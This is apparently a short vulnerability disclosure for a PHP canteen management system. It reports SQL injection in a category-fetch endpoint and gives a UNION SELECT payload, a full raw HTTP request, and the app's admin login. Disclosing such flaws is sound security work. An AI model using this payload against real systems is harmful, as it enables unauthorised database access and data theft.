# Canteen Management System v1.0 by mayuri_k has SQL injection

BUG_Author: Qianxin Niu

vendors: https://www.sourcecodester.com/php/15688/canteen-management-system-project-source-code-php.html

The program is built using the xmapp-php8.1 version

Login account: mayuri.infospace@gmail.com/rootadmin (Super Admin account)

Vulnerability File: /youthappam/php_action/fetchSelectedCategories.php

Vulnerability location: /youthappam/php_action/fetchSelectedCategories.php, categoriesId

dbname =youthappam,length=10

[+] Payload: categoriesId=-1 union select 1,database(),3,4 // Leak place ---> categoriesId

```sql
POST /youthappam/php_action/fetchSelectedCategories.php HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=lf9hph2449vgrcadcct2jgd8ne
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

categoriesId=-1 union select 1,database(),3,4
```

![image](https://user-images.githubusercontent.com/54017627/195264798-d8683164-5a65-4136-9e2a-85e35a1054fe.png)
